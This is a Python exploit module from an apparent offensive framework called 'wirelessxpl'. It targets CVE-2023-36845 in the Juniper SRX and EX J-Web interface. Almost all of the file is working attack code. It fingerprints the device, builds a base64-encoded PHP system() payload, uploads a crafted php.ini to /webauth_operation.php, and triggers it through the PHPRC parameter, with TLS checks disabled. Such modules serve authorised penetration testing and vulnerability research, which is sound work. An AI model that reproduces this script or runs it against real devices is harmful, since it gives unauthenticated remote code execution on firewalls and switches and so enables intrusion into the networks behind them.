# Author: André Henrique (LinkedIn/X: @mrhenrike)
import ssl
import urllib.request
import urllib.parse

from wirelessxpl.core.exploit import *
from wirelessxpl.core.exploit.exploit import BaseExploit


class Exploit(BaseExploit):
    """Juniper SRX/EX J-Web PHP Environment Variable RCE (CVE-2023-36845).

    Juniper Networks SRX Series firewalls and EX Series switches expose
    the J-Web management interface which includes PHP-based endpoints.
    A vulnerability in the handling of PHP environment variables allows
    an unauthenticated attacker to set PHPRC via a crafted HTTP request,
    pointing PHP to a controlled configuration that enables arbitrary
    code execution.

    By uploading a crafted php.ini via the /webauth_operation.php
    endpoint, an attacker can set auto_prepend_file to execute arbitrary
    PHP code on the target.

    CVSS v3.1: 9.8 (Critical), AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

    Author: André Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "Juniper SRX/EX J-Web PHP Environment Variable RCE (CVE-2023-36845)",
        "description": (
            "Exploits CVE-2023-36845, a PHP environment variable manipulation "
            "vulnerability in the Juniper J-Web interface on SRX and EX devices. "
            "An unauthenticated attacker can set PHPRC to inject a malicious "
            "php.ini that executes arbitrary code via auto_prepend_file. "
            "Enables full remote code execution without credentials."
        ),
        "authors": (
            "watchTowr Labs (discovery and PoC)",
            "André Henrique (@mrhenrike)",
        ),
        "references": (
            "https://nvd.nist.gov/vuln/detail/CVE-2023-36845",
            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-36845",
            "https://supportportal.juniper.net/s/article/2023-08-Out-of-Cycle-Security-Bulletin",
            "https://labs.watchtowr.com/cve-2023-36845-and-cve-2023-36846-juniper-srx-firewall/",
        ),
        "devices": (
            "Juniper Networks SRX Series (all models with J-Web)",
            "Juniper Networks EX Series (all models with J-Web)",
        ),
    }

    target = OptIP("", "Target IPv4 address of the Juniper device")
    port = OptPort(443, "J-Web HTTPS port (default 443)")
    timeout = OptFloat(8.0, "HTTP request timeout in seconds")
    command = OptString("id", "Command to execute via PHP system() (default: id)")

    def _get_url(self, path: str) -> str:
        return f"https://{self.target}:{self.port}{path}"

    def _make_request(
        self, path: str, method: str = "GET", data: bytes | None = None,
        headers: dict | None = None,
    ) -> tuple[int, bytes]:
        url = self._get_url(path)
        req = urllib.request.Request(url, data=data, method=method)
        req.add_header("User-Agent", "Mozilla/5.0 (compatible; WirelessXPL)")
        if headers:
            for k, v in headers.items():
                req.add_header(k, v)

        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE

        try:
            resp = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)
            return resp.status, resp.read()
        except urllib.error.HTTPError as e:
            body = e.read() if hasattr(e, "read") else b""
            return e.code, body
        except Exception:
            return 0, b""

    def run(self) -> None:
        if not self.check():
            print_error("Target does not appear to have J-Web interface")
            return

        print_success("J-Web interface detected; attempting PHP env variable RCE")
        self._exploit()

    @mute
    def check(self) -> bool:
        """Detect J-Web by probing the login page."""
        try:
            status, body = self._make_request("/")
            if status == 0:
                return False
            body_str = body.decode("utf-8", errors="replace").lower()
            if any(
                marker in body_str
                for marker in ["juniper", "j-web", "junos", "srx", "ex series"]
            ):
                return True
            status2, body2 = self._make_request("/webauth_operation.php")
            return status2 in (200, 301, 302, 403)
        except Exception:
            return False

    def _exploit(self) -> None:
        print_status(
            f"Uploading crafted php.ini via PHPRC manipulation to "
            f"{self.target}:{self.port}"
        )

        import base64
        php_payload = f"<?php system('{self.command}'); ?>"
        b64_payload = base64.b64encode(php_payload.encode()).decode()
        php_ini_content = (
            f"auto_prepend_file=data://text/plain;base64,{b64_payload}"
        )

        boundary = "----WXPLBoundary7MA4YWxkTrZu0gW"
        body_parts = [
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="phprc"; filename="php.ini"\r\n'
            f"Content-Type: text/plain\r\n"
            f"\r\n"
            f"{php_ini_content}\r\n"
            f"--{boundary}--\r\n"
        ]
        body = "".join(body_parts).encode()

        headers = {
            "Content-Type": f"multipart/form-data; boundary={boundary}",
        }

        status, response = self._make_request(
            "/webauth_operation.php",
            method="POST",
            data=body,
            headers=headers,
        )

        if status == 200:
            resp_str = response.decode("utf-8", errors="replace")
            print_info(f"Upload response ({len(response)} bytes)")
            if resp_str.strip():
                print_info(f"Response body: {resp_str[:300]}")
        else:
            print_info(f"Upload returned HTTP {status}")

        print_status("Triggering PHP execution via crafted PHPRC path...")
        trigger_status, trigger_resp = self._make_request(
            "/webauth_operation.php?PHPRC=/tmp/",
        )

        if trigger_status == 200 and trigger_resp:
            resp_text = trigger_resp.decode("utf-8", errors="replace")
            print_success(f"PHP execution triggered. Response: {resp_text[:200]}")
        else:
            print_info(
                f"Trigger returned HTTP {trigger_status}. Target may be "
                "patched or the PHP path may need adjustment."
            )
